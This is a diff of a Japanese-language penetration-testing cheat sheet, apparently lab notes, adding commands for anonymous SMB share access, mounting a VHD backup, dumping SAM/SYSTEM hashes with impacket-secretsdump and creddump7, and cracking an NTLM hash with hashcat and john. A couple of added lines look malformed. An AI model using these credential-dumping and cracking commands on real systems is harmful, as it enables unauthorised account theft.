@@ -493,7 +493,9 @@ pwdump SYSTEM SAM
 
 samdump2 SYSTEM SAM
 
-secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
+impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
+
+impacket-secretsdump -sam SAM -security -system SYSTEM local
 ```
 
 #### Log Poisoning(LFI2RCE)
@@ -1063,6 +1065,7 @@ enum4linux -S -U -o 10.10.10.1
 ```
 smbclient -L -N //10.10.10.1
 smbclient -L //10.10.10.1
+smbclient -N //10.10.10.1
 smbclient //10.10.10.1/tmp
 smbclient //10.10.10.1/tmp -U <username>
 ```
@@ -1070,6 +1073,16 @@ smbclient //10.10.10.1/tmp -U <username>
 - -N...パスワードなし
 - -U...ユーザ名の指定
 - -p...ポートの指定
+
+```
+Unable to connect with SMB1 -- no workgroup available
+```
+上記が表示された場合には-Lオプションを取り除いて、
+```
+smbclient //10.10.10.1/Backups
+smbclient -N //10.10.10.1/Backups
+```
+などを指定する。
 
 #### 共有フォルダのマウント
 ```
@@ -1080,7 +1093,17 @@ sudo mount -t cifs //10.10.10.134/backups /mnt -o user=,password=
 VHD Mount(VHDファイルからSAMとSYSTEMを抽出):
 ```
 sudo apt-get install libguestfs-tools
-sudo guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/test
+sudo mkdir /mnt/vhd
+sudo guestmount --add file.vhd --inspector --ro -v /mnt/vhd
+sudo cd /Windows/System32/config
+cp SAM SYSTEM /home/kali
+
+impacket-secretsdump -sam SAM -system SYSTEM local
+or
+/usr/share/creddump7/pwdump.py SYSTEM SAM
+
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+hashcat -m 1000 --force 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt
 ```
 
 ### smbmap
@@ -1589,6 +1612,11 @@ john --show hash.txt
 ### md5
 ```
 john --wordlist=/usr/share/wordlist/rockyou.txt --format=Raw-MD5 hash.txt
+```
+
+### NTLM
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash.txt
 ```
 
 ### 同じファイルをクラックした時に出るエラー
@@ -2875,13 +2903,15 @@ copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
 ```
 creddump7を利用してSAMファイルとSYSTEMファイルからハッシュをダンプする。
 ```
-git clone https://github.com/Tib3rius/creddump7
-pip3 install pycrypto
-python3 creddump7/pwdump.py SYSTEM SAM
+/usr/share/creddump7/pwdump.py SYSTEM SAM
 ```
 hashcatを使用してNTLMハッシュをクラックする。
 ```
-hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+例)
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+hashcat -m 1000 --force 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt
+or
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash
 ```
 
 ## Passwords - Pass The Hash
